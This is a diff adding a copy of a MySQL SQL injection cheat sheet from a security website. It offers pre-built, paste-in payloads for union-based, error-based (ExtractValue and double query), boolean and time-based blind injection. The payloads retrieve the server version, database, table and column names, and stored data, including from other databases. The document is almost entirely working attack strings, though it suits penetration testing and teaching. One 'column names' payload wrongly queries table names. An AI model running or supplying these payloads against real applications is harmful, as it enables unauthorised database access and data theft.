@@ -1,0 +1,205 @@
+https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
+
+There are lot of excellent SQL injection cheat sheets out there; however, I found the majority provide only the components of a SQL injection rather an entire, working string. As a result, successfully putting a valid query together can take some trial and error and waste precious time. I have thus attempted to create a list of pre-made strings for each type of SQL injection so that they can simply be pasted in with little modification.
+
+ 
+
+As SQL injections can loosely be grouped into three categories, union based, error based (XPath and double query) and inferential (time based and boolean), I have listed them as such. Below you will find MySQL specific syntax whilst I will post my MSSQL cheat sheet shortly.
+
+ 
+
+To avoid repetition, anywhere you see: version() (used to to retrieve the database version) you can replace it with:
+
+ 
+
+database() – to retrieve the current database’s name
+user() – to retrieve the username that the database runs under
+@@hostname – to retrieve the hostname and IP address of the server
+@@datadir – to retrieve the location of the database files
+
+ 
+
+Note that my examples below will be constructed for injecting into an integer field. If it’s a string field, simply add a single quote after the vulnerable parameter. I’ve also included the comment character in my injection strings; however, they may not be necessary depending on where in the SQL query the injection occurs. Lastly, don’t forget the space after the comment!
+
+ 
+UNION
+
+UNION is used to append our SQL injection to a legitimate query and combine the information we wish to retrieve with that of the legitimate query. Note that you need to enumerate the number of columns first, this can be achieved by using the ORDER BY function or using UNION with NULL values.
+
+ 
+
+Assuming there are two columns:
+
+ 
+
+Retrieve database version:
+
+1 UNION ALL SELECT NULL,version()--
+
+Retrieve database names:
+
+1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
+
+Retrieve table names:
+
+1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='database1'--
+
+Retrieve column names:
+
+1 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'--
+
+Retrieve data:
+
+1 UNION ALL SELECT NULL,concat(0x28,column1,0x3a,column2,0x29) FROM table1--
+
+Retrieve data from another database:
+
+1 UNION ALL SELECT NULL,concat(0x28,column1,0x3a,column2,0x29) FROM database2.table1--
+
+Error Based
+
+When there is no output except a MySQL error, you can force your data extraction through the error. Note that both of the below methods can be easily automated using Burp’s Intruder and the grep extract functionality.
+
+XPath
+
+The ExtractValue() function generates a SQL error when it is unable to parse the XML data passed to it. Fortunately, the XML data, and, in our case, the evaluated results of our SQL query, will be be embedded into the subsequent error message. Prepending a full stop or a colon (we use the hex representation of 0x3a below) to the beginning of the XML query will ensure the parsing will always fail, thus generating an error with our extracted data. Note that this only works on MySQL version 5.1 or later. Use the LIMIT function to cycle through database information.
+
+ 
+
+Retrieve database version:
+
+ 
+
+1 AND extractvalue(rand(),concat(0x3a,version()))--
+
+Retrieve database names:
+
+1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1)))--
+
+Retrieve table names:
+
+1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1)))--
+
+Retrieve column names:
+
+1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_NAME="table1" LIMIT 0,1)))--
+
+Retrieve data:
+
+1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(column1,0x3a,column2) FROM table1 LIMIT 0,1)))--
+
+Retrieve data from another database:
+
+1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(column1,0x3a,column2) FROM database2.table1 LIMIT 0,1)))--
+
+Double Query
+
+The functions used below combine to produce a query which is accepted by the MySQL compiler but errors at runtime. The error is then returned, but it evaluates and includes the subquery (due to the double select), thus returning the results of our injection to the page. Increment the first LIMIT to cycle through the database information.
+Retrieve database version:
+
+1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
+
+Retrieve database names:
+
+1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.schemata GROUP BY a LIMIT 0,1)b)--
+
+Retrieve table names:
+
+1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.TABLES GROUP BY a LIMIT 0,1)b)--
+
+Retrieve column names:
+
+1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.COLUMNS GROUP BY a LIMIT 0,1)b)--
+
+Retrieve data:
+
+1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT column1 FROM table1 LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
+
+Retrieve data from another database:
+
+1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT column1 FROM database2.table1 LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
+
+Inferential
+
+When no data or error messages are returned, you can use time delays or true/false responses to retrieve database information. Note that automated tools such as sqlmap significantly speed up the process.
+
+Boolean
+
+This type of extraction is used when the application returns differing results dependent on whether the SQL query we inject evaluates to true or false. If we convert each individual character of the piece of database information we wish to retrieve to their decimal representation using the ASCII function (table here), we can create true or false conditions using the greater than, less than and equals symbols. We can then cycle through the individual characters using the SUBSTRING function and the pieces of database information using the LIMIT function.
+
+ 
+
+Test for the presence of the vulnerability. This query should result in the original page being displayed:
+
+1 AND 1=1
+
+Whilst this query should return a different page:
+
+1 AND 1=2
+
+Retrieve version:
+
+1 AND (ascii(substr((SELECT version()),1,1))) > 52--
+
+Note, a better way to retrieve the version in this context is to use the LIKE function:
+
+1 AND (SELECT version()) LIKE "5%"--
+
+Retrieve databases:
+
+1 AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 95--
+
+Retrieve tables:
+
+1 AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),1,1))) > 95--
+
+Retrieve columns:
+
+1 AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),1,1))) > 95--
+
+Retrieve data:
+
+1 AND (ascii(substr((SELECT column1 FROM table1 LIMIT 0,1),1,1))) > 95--
+
+Retrieve data from another database:
+
+1 AND (ascii(substr((SELECT column1 FROM database2.table1 LIMIT 0,1),1,1))) > 95--
+
+Time Based
+
+If identical pages are returned for true or false responses, time delays can be created by the IF andSLEEP functions and used to deduce database information instead.
+
+ 
+
+Test for the presence of the vulnerability:
+
+1 AND sleep(10)--
+
+Retrieve version:
+
+1 AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL)--
+
+Retrieve version using LIKE:
+
+1 AND IF((SELECT version()) LIKE "5%",sleep(10),NULL)--
+
+Retrieve databases:
+
+1 AND IF(((ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
+
+Retrieve tables:
+
+1 AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),1,1))))> 95,sleep(10),NULL)--
+
+Retrieve columns:
+
+1 AND IF(((ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
+
+Retrieve data:
+
+1 AND IF(((ascii(substr((SELECT column1 FROM table1 LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
+
+Retrieve data from another database:
+
+1 AND IF(((ascii(substr((SELECT column1 FROM database1.table1 LIMIT 0,1),1,1)))) >95,sleep(10),NULL)--
+
